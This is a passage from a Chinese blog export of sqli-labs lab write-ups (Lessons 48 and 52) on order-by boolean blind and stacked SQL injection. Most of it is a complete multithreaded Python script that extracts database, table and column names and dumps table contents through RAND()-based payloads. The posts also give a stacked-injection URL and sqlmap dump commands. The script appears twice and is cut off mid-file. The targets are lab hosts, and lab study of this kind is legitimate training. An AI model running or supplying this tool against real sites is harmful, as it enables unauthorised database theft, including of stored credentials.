class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    parser = OptionParser()</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-u'</span>, <span class=\"string\">'--url'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'url'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-D'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'db'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-T'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'tbl'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table(s) to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-C'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'col'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table column(s) to enumerate, use like id,password'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dbs'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dbs'</span>, help=<span class=\"string\">'Enumerate ALL database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--tables'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'tables'</span>, help=<span class=\"string\">'Enumerate DBMS database tables'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--columns'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'columns'</span>, help=<span class=\"string\">'Enumerate DBMS database table columns'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dump'</span>, help=<span class=\"string\">'Dump DBMS database table entries'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump-all'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'all'</span>, help=<span class=\"string\">'Dump all DBMS databases tables entries'</span>)</span><br><span class=\"line\">    (options, args) = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    basehtml = getbasehtml(</span><br><span class=\"line\">        <span class=\"string\">'http://10.60.250.239/sql/Less-48/?sort=RAND(true)'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> options.url <span class=\"keyword\">and</span> options.dbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        getdbname(url, basehtml)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tables:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        get_table_name(url, basehtml, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.col <span class=\"keyword\">and</span> options.dump):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        coname = options.col</span><br><span class=\"line\">        dump(url, basehtml, tbname, dbname, coname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.all):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        dump(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.columns):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        get_column_name(url, basehtml, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        parser.print_help()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u http://10.60.250.239/sql/Less-48/?sort=1 --technique B --level 2 --risk 2 --dbms mysql --threads 25</code></p>\n<p><img src=\"/img/sql/Lesson-48/012.png\" alt=\"012\"></p>\n<p><img src=\"/img/sql/Lesson-48/013.png\" alt=\"013\"></p>\n<p>直接上结果</p>\n<p><img src=\"/img/sql/Lesson-48/014.png\" alt=\"014\"></p>\n<p><img src=\"/img/sql/Lesson-48/015.png\" alt=\"015\"></p>\n"},{"title":"sqli-labs lession-52 GET-盲注-数字型堆叠注入-OrderBy注入","date":"2018-11-19T01:55:01.000Z","_content":"\n# sqli-labs lession-52 GET-盲注-数字型堆叠注入-OrderBy注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-52/001.png)\n\n## 注入\n\n### 判断类型\n\n数字型是受排序方式影响的\n\n![002](/img/sql/Lesson-52/002.png)\n\n这里与上一课不同,没有报错。\n\n### 布尔型注入利用\n\n发现rand(true)和rand(false)返回值不同,可以利用布尔盲注脚本代替手注过程。\n\n![003](/img/sql/Lesson-52/003.png)\n\n拿之前的写过的布尔脚本改一改。\n\n![004](/img/sql/Lesson-52/004.png)\n\n![005](/img/sql/Lesson-52/005.png)\n\n![006](/img/sql/Lesson-52/006.png)\n\n![007](/img/sql/Lesson-52/007.png)\n\n```\n#l52.py\nimport requests\nimport re\nimport threading\nfrom optparse import OptionParser\n\nheaders = {\n    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'}\n\n\ndef getpayload(url, payload):\n    return url + payload\n\n\ndef getbasehtml(url):\n    basehtml = requests.get(url, headers=headers).content\n    return basehtml\n\n\ndef binary_search_db(url, basehtml, payload):\n    i = 1\n    s = \"\"\n    while 1:\n        count = 0\n        mid = 0\n        low = 47\n        high = 57\n        while low <= high:\n            mid = int((low + high) / 2)\n            newpayload = payload % (i, mid)\n            html = requests.get(getpayload(url, newpayload),\n                                headers=headers).content\n            if basehtml == html:\n                low = mid + 1\n                count += 1\n            else:\n                high = mid - 1\n        if count != 0:\n            s = s + chr(int((low + high + 1) / 2))\n            i = i + 1\n        else:\n            break\n    return int(s)\n\n\ndef getdbnum(url, basehtml):\n    num = 0\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))>%d)\"\n    num = binary_search_db(url, basehtml, payload)\n    print('[+]数据库数 [%d]' % num)\n    return num\n\n\ndef get_all_db_len(url, basehtml, num):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))>%d)\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, basehtml, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    print(lenth)\n    return lenth\n\n# 取与法\n\n\ndef and_method(url, payload):\n    two = [1, 2, 4, 8, 16, 32, 64, 128]\n    s = 0\n    keys = []\n    thread = []\n    m = []\n    basehtml = requests.get(\n        'http://10.60.17.35:8082/Less-52/?sort=rand(true)', headers=headers).content\n\n    def run_thread(url, i, s):\n        html = requests.get(url, headers=headers).content\n        if (basehtml == html):\n            s = s | two[i]\n            m.append(s)\n\n    for i in range(8):\n        newpayload = \"\"\n        newpayload = payload + \"%26\" + \"%d=%d)\" % (two[i], two[i])\n        keys.append(newpayload)\n\n    for i in range(8):\n        t = threading.Thread(target=run_thread, args=(\n            getpayload(url, keys[i]), i, s,))\n        thread.append(t)\n\n    for t in thread:\n        t.start()\n    for t in thread:\n        t.join()\n\n    for i in m:\n        s = s | i\n    return chr(s)\n\n\ndef getdbname(url, basehtml):\n    num = getdbnum(url, basehtml)\n    lenth = get_all_db_len(url, basehtml, num)\n    dbs = []\n\n    for i in range(int(len(lenth))):\n        dbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = \"RAND(ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\" % (\n                i, j)\n            dbname += and_method(url, payload)\n            print('[-]当前猜解', dbname)\n        print(dbname)\n        dbs.append(dbname)\n    print('available databases [%s]' % num)\n    for db in dbs:\n        print('[*]', db)\n\n\ndef get_table_num(url, basehtml, dbname):\n    num = 0\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\" % dbname\n    payload += \"%d,1))>%d)\"\n    # print(payload)\n    num = binary_search_db(url, basehtml, payload)\n    print('[+]数据表数 [%d]' % num)\n    return num\n\n\ndef get_all_table_len(url, basehtml, num, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\" % dbname\n        payload += \"%d,1))>%d)\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, basehtml, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n\ndef get_table_name(url, basehtml, dbname):\n    num = get_table_num(url, basehtml, dbname)\n    lenth = get_all_table_len(url, basehtml, num, dbname)\n    tables = []\n\n    for i in range(int(len(lenth))):\n        tbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = \"RAND(ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\" % dbname\n            payload += \" %d,1),%d,1))\" % (i, j)\n            tbname += and_method(url, payload)\n            print('[-]当前猜解', tbname)\n        print(tbname)\n        tables.append(tbname)\n    print('Database: %s' % dbname)\n    print('[%d tables]' % num)\n    for table in tables:\n        print('[*]', table)\n\n# 获取列数\n\n\ndef get_column_num(url, basehtml, tbname, dbname):\n    num = 0\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\" % (\n        tbname, dbname)\n    payload += \"%d,1))>%d)\"\n    num = binary_search_db(url, basehtml, payload)\n    print('[+]列数 [%d]' % num)\n    return num\n\n# 获取列长度\n\n\ndef get_all_columns_len(url, basehtml, num, tbname, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\" % (\n            tbname, dbname)\n        payload += \"%d,1))>%d)\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"co\" + str(i) + \":\" + str(binary_search_db(url, basehtml, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'co\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 获取列名\n\n\ndef get_column_name(url, basehtml, tbname, dbname):\n    num = get_column_num(url, basehtml, tbname, dbname)\n    lenth = get_all_columns_len(url, basehtml, num, tbname, dbname)\n    columns = []\n\n    for i in range(int(len(lenth))):\n        coname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = \"RAND(ascii(substr((select column_name from information_schema.columns where table_name='%s' AND table_schema='%s' limit\" % (\n                tbname, dbname)\n            payload += \" %d,1),%d,1))\" % (i, j)\n            coname += and_method(url, payload)\n            print('[-]当前猜解', coname)\n        print(coname)\n        columns.append(coname)\n    print('Database: %s' % dbname)\n    print('Table: %s' % tbname)\n    print('[%d columns]' % num)\n    for column in columns:\n        print('[*]', column)\n    return columns\n\n# 获取字段数\n\n\ndef get_data_num(url, basehtml, tbname, dbname):\n    num = 0\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\" % (dbname, tbname)\n    payload += \" %d,1))>%d)\"\n    num = binary_search_db(url, basehtml, payload)\n    print('[+]字段数 [%d]' % num)\n    return num\n\n# 获取字段长度\n\n\ndef get_data_len(url, basehtml, coname, tbname, dbname, i):\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\" % (\n        coname, dbname, tbname, i)\n    payload += \" %d,1))>%d)\"\n    lenth = binary_search_db(url, basehtml, payload)\n    print('[+]当前字段`%s`长度: %d' % (coname, lenth))\n    return lenth\n\n# 获取字段值\n\n\ndef get_data(url, basehtml, coname, tbname, dbname, count):\n    lenth = get_data_len(url, basehtml, coname, tbname, dbname, count)\n    data = \"\"\n    for i in range(lenth):\n        payload = \"RAND(ascii(substr((select %s from %s.%s limit %d,1),%d,1))\" % (\n            coname, dbname, tbname, count, i + 1)\n        data += and_method(url, payload)\n        print('[-]当前猜解', data)\n    print(data)\n    return data\n\n\ndef dump(url, basehtml, tbname, dbname, coname=None):\n    num = get_data_num(url, basehtml, tbname, dbname)\n    if coname is None:\n        columns = get_column_name(url, basehtml, tbname, dbname)\n    else:\n        columns = coname.split(\",\")\n    print(columns)\n    datas = []\n    for i in range(num):\n        for column in columns:\n            data = get_data(url, basehtml, column, tbname, dbname, i)\n            datas.append(data)\n        datas.append('.')\n\n    res = [s.split() for s in ' '.join(datas).split('.') if s]\n\n    for i in res:\n        for j in i:\n            print('%-15s' % j, end='')\n        print(\"\\n\")\n\n\ndef main():\n    parser = OptionParser()\n    parser.add_option('-u', '--url', type='string', dest='url',\n                      help='Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")')\n    parser.add_option('-D', type='string', dest='db',\n                      help='DBMS database to enumerate')\n    parser.add_option('-T', type='string', dest='tbl',\n                      help='DBMS database table(s) to enumerate')\n    parser.add_option('-C', type='string', dest='col',\n                      help='DBMS database table column(s) to enumerate, use like id,password')\n    parser.add_option('--dbs', action='store_true',\n                      dest='dbs', help='Enumerate ALL database')\n    parser.add_option('--tables', action='store_true',\n                      dest='tables', help='Enumerate DBMS database tables')\n    parser.add_option('--columns', action='store_true',\n                      dest='columns', help='Enumerate DBMS database table columns')\n    parser.add_option('--dump', action='store_true',\n                      dest='dump', help='Dump DBMS database table entries')\n    parser.add_option('--dump-all', action='store_true',\n                      dest='all', help='Dump all DBMS databases tables entries')\n    (options, args) = parser.parse_args()\n\n    basehtml = getbasehtml(\n        'http://10.60.17.35:8082/Less-52/?sort=rand(true)')\n\n    if options.url and options.dbs:\n        url = options.url\n        getdbname(url, basehtml)\n    elif options.url and options.db and options.tables:\n        url = options.url\n        dbname = options.db\n        get_table_name(url, basehtml, dbname)\n    elif (options.url and options.db and options.tbl and options.col and options.dump):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        coname = options.col\n        dump(url, basehtml, tbname, dbname, coname)\n    elif (options.url and options.db and options.tbl and options.all):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        dump(url, basehtml, tbname, dbname)\n    elif (options.url and options.db and options.tbl and options.columns):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        get_column_name(url, basehtml, tbname, dbname)\n    else:\n        parser.print_help()\n\n\nif __name__ == '__main__':\n    main()\n```\n\n\n\n## 堆叠注入\n\n`http://10.60.17.35:8082/Less-52/?sort=rand(false);create+table+less52+like+users`\n\n![008](/img/sql/Lesson-52/008.png)\n\n![009](/img/sql/Lesson-52/009.png)\n\n## SQLMAP\n\n`sqlmap -u http://10.60.17.35:8082/Less-52/?sort=1 --technique B --dbms mysql --threads 20`\n\n![010](/img/sql/Lesson-52/010.png)\n\n![011](/img/sql/Lesson-52/011.png)\n\n`sqlmap -u http://10.60.17.35:8082/Less-52/?sort=1 --technique B --dbms mysql --threads 20 -D security -T users -C username,password --dump`\n\n![012](/img/sql/Lesson-52/012.png)","source":"_posts/sqli-labs-lession-52-GET-盲注-数字型堆叠注入-OrderBy注入.md","raw":"---\ntitle: sqli-labs lession-52 GET-盲注-数字型堆叠注入-OrderBy注入\ndate: 2018-11-19 09:55:01\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-52 GET-盲注-数字型堆叠注入-OrderBy注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-52/001.png)\n\n## 注入\n\n### 判断类型\n\n数字型是受排序方式影响的\n\n![002](/img/sql/Lesson-52/002.png)\n\n这里与上一课不同,没有报错。\n\n### 布尔型注入利用\n\n发现rand(true)和rand(false)返回值不同,可以利用布尔盲注脚本代替手注过程。\n\n![003](/img/sql/Lesson-52/003.png)\n\n拿之前的写过的布尔脚本改一改。\n\n![004](/img/sql/Lesson-52/004.png)\n\n![005](/img/sql/Lesson-52/005.png)\n\n![006](/img/sql/Lesson-52/006.png)\n\n![007](/img/sql/Lesson-52/007.png)\n\n```\n#l52.py\nimport requests\nimport re\nimport threading\nfrom optparse import OptionParser\n\nheaders = {\n    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'}\n\n\ndef getpayload(url, payload):\n    return url + payload\n\n\ndef getbasehtml(url):\n    basehtml = requests.get(url, headers=headers).content\n    return basehtml\n\n\ndef binary_search_db(url, basehtml, payload):\n    i = 1\n    s = \"\"\n    while 1:\n        count = 0\n        mid = 0\n        low = 47\n        high = 57\n        while low <= high:\n            mid = int((low + high) / 2)\n            newpayload = payload % (i, mid)\n            html = requests.get(getpayload(url, newpayload),\n                                headers=headers).content\n            if basehtml == html:\n                low = mid + 1\n                count += 1\n            else:\n                high = mid - 1\n        if count != 0:\n            s = s + chr(int((low + high + 1) / 2))\n            i = i + 1\n        else:\n            break\n    return int(s)\n\n\ndef getdbnum(url, basehtml):\n    num = 0\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))>%d)\"\n    num = binary_search_db(url, basehtml, payload)\n    print('[+]数据库数 [%d]' % num)\n    return num\n\n\ndef get_all_db_len(url, basehtml, num):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))>%d)\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, basehtml, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    print(lenth)\n    return lenth\n\n# 取与法\n\n\ndef and_method(url, payload):\n    two = [1, 2, 4, 8, 16, 32, 64, 128]\n    s = 0\n    keys = []\n    thread = []\n    m = []\n    basehtml = requests.get(\n        'http://10.60.17.35:8082/Less-52/?sort=rand(true)', headers=headers).content\n\n    def run_thread(url, i, s):\n        html = requests.get(url, headers=headers).content\n        if (basehtml == html):\n            s = s | two[i]\n            m.append(s)\n\n    for i in range(8):\n        newpayload = \"\"\n        newpayload = payload + \"%26\" + \"%d=%d)\" % (two[i], two[i])\n        keys.append(newpayload)\n\n    for i in range(8):\n        t = threading.Thread(target=run_thread, args=(\n            getpayload(url, keys[i]), i, s,))\n        thread.append(t)\n\n    for t in thread:\n        t.start()\n    for t in thread:\n        t.join()\n\n    for i in m:\n        s = s | i\n    return chr(s)\n\n\ndef getdbname(url, basehtml):\n    num = getdbnum(url, basehtml)\n    lenth = get_all_db_len(url, basehtml, num)\n    dbs = []\n\n    for i in range(int(len(lenth))):\n        dbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = \"RAND(ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\" % (\n                i, j)\n            dbname += and_method(url, payload)\n            print('[-]当前猜解', dbname)\n        print(dbname)\n        dbs.append(dbname)\n    print('available databases [%s]' % num)\n    for db in dbs:\n        print('[*]', db)\n\n\ndef get_table_num(url, basehtml, dbname):\n    num = 0\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\" % dbname\n    payload += \"%d,1))>%d)\"\n    # print(payload)\n    num = binary_search_db(url, basehtml, payload)\n    print('[+]数据表数 [%d]' % num)\n    return num\n\n\ndef get_all_table_len(url, basehtml, num, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\" % dbname\n        payload += \"%d,1))>%d)\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, basehtml, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n\ndef get_table_name(url, basehtml, dbname):\n    num = get_table_num(url, basehtml, dbname)\n    lenth = get_all_table_len(url, basehtml, num, dbname)\n    tables = []\n\n    for i in range(int(len(lenth))):\n        tbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = \"RAND(ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\" % dbname\n            payload += \" %d,1),%d,1))\" % (i, j)\n            tbname += and_method(url, payload)\n            print('[-]当前猜解', tbname)\n        print(tbname)\n        tables.append(tbname)\n    print('Database: %s' % dbname)\n    print('[%d tables]' % num)\n    for table in tables:\n        print('[*]', table)\n\n# 获取列数\n\n\ndef get_column_num(url, basehtml, tbname, dbname):\n    num = 0\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\" % (\n        tbname, dbname)\n    payload += \"%d,1))>%d)\"\n    num = binary_search_db(url, basehtml, payload)\n    print('[+]列数 [%d]' % num)\n    return num\n\n# 获取列长度\n\n\ndef get_all_columns_len(url, basehtml, num, tbname, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\" % (\n            tbname, dbname)\n        payload += \"%d,1))>%d)\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"co\" + str(i) + \":\" + str(binary_search_db(url, basehtml, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'co\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 获取列名\n\n\ndef get_column_name(url, basehtml, tbname, dbname):\n    num = get_column_num(url, basehtml, tbname, dbname)\n    lenth = get_all_columns_len(url, basehtml, num, tbname, dbname)\n    columns = []\n\n    for i in range(int(len(lenth))):\n        coname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = \"RAND(ascii(substr((select column_name from information_schema.columns where table_name='%s' AND table_schema='%s' limit\" % (\n                tbname, dbname)\n            payload += \" %d,1),%d,1))\" % (i, j)\n            coname += and_method(url, payload)\n            print('[-]当前猜解', coname)\n        print(coname)\n        columns.append(coname)\n    print('Database: %s' % dbname)\n    print('Table: %s' % tbname)\n    print('[%d columns]' % num)\n    for column in columns:\n        print('[*]', column)\n    return columns\n\n# 获取字段数\n\n\ndef get_data_num(url, basehtml, tbname, dbname):\n    num = 0\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\" % (dbname, tbname)\n    payload += \" %d,1))>%d)\"\n    num = binary_search_db(url, basehtml, payload)\n    print('[+]字段数 [%d]' % num)\n    return num\n\n# 获取字段长度\n\n\ndef get_data_len(url, basehtml, coname, tbname, dbname, i):\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\" % (\n        coname, dbname, tbname, i)\n    payload += \" %d,1))>%d)\"\n    lenth = binary_search_db(url, basehtml, payload)\n    print('[+]当前字段`%s`长度: %d' % (coname, lenth))\n    return lenth\n\n# 获取字段值\n\n\ndef get_data(url, basehtml, coname, tbname, dbname, count):\n    lenth = get_data_len(url, basehtml, coname, tbname, dbname, count)\n    data = \"\"\n    for i in range(lenth):\n        payload = \"RAND(ascii(substr((select %s from %s.%s limit %d,1),%d,1))\" % (\n            coname, dbname, tbname, count, i + 1)\n        data += and_method(url, payload)\n        print('[-]当前猜解', data)\n    print(data)\n    return data\n\n\ndef dump(url, basehtml, tbname, dbname, coname=None):\n    num = get_data_num(url, basehtml, tbname, dbname)\n    if coname is None:\n        columns = get_column_name(url, basehtml, tbname, dbname)\n    else:\n        columns = coname.split(\",\")\n    print(columns)\n    datas = []\n    for i in range(num):\n        for column in columns:\n            data = get_data(url, basehtml, column, tbname, dbname, i)\n            datas.append(data)\n        datas.append('.')\n\n    res = [s.split() for s in ' '.join(datas).split('.') if s]\n\n    for i in res:\n        for j in i:\n            print('%-15s' % j, end='')\n        print(\"\\n\")\n\n\ndef main():\n    parser = OptionParser()\n    parser.add_option('-u', '--url', type='string', dest='url',\n                      help='Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")')\n    parser.add_option('-D', type='string', dest='db',\n                      help='DBMS database to enumerate')\n    parser.add_option('-T', type='string', dest='tbl',\n                      help='DBMS database table(s) to enumerate')\n    parser.add_option('-C', type='string', dest='col',\n                      help='DBMS database table column(s) to enumerate, use like id,password')\n    parser.add_option('--dbs', action='store_true',\n                      dest='dbs', help='Enumerate ALL database')\n    parser.add_option('--tables', action='store_true',\n                      dest='tables', help='Enumerate DBMS database tables')\n    parser.add_option('--columns', action='store_true',\n                      dest='columns', help='Enumerate DBMS database table columns')\n    parser.add_option('--dump', action='store_true',\n                      dest='dump', help='Dump DBMS database table entries')\n    parser.add_option('--dump-all', action='store_true',\n                      dest='all', help='Dump all DBMS databases tables entries')\n    (options, args) = parser.parse_args()\n\n    basehtml = getbasehtml(\n        'http://10.60.17.35:8082/Less-52/?sort=rand(true)')\n\n    if options.url and options.dbs:\n        url = options.url\n        getdbname(url, basehtml)\n    elif options.url and options.db and options.tables:\n        url = options.url\n        dbname = options.db\n        get_table_name(url, basehtml, dbname)\n    elif (options.url and options.db and options.tbl and options.col and options.dump):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        coname = options.col\n        dump(url, basehtml, tbname, dbname, coname)\n    elif (options.url and options.db and options.tbl and options.all):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        dump(url, basehtml, tbname, dbname)\n    elif (options.url and options.db and options.tbl and options.columns):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        get_column_name(url, basehtml, tbname, dbname)\n    else:\n        parser.print_help()\n\n\nif __name__ == '__main__':\n    